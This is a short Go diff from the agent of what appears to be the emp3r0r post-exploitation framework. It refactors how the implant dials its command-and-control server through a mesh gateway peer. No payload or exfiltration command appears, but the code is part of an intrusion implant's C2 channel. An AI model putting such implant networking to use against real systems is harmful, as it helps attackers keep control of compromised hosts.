@@ -175,11 +175,11 @@ func agent_main() {
 			// to dial a fresh DialGateway per request using the current best gateway.
 			// mesh.GetGatewayIP() is re-evaluated per dial, so gateway failover is automatic.
 			transport.GlobalMeshDialer = func(ctx context.Context, _, _ string) (net.Conn, error) {
-				gwIP := mesh.GetGatewayIP()
-				if gwIP == "" {
+				peer := mesh.GetGatewayPeer()
+				if peer.Addr == "" {
 					return nil, fmt.Errorf("mesh: no gateway available")
 				}
-				return mesh.DialGateway(ctx, gwIP, mesh.OpcodeConnectC2)
+				return mesh.DialGatewayPeer(ctx, peer, mesh.OpcodeConnectC2)
 			}
 			def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
 			if def.HTTPClient == nil {
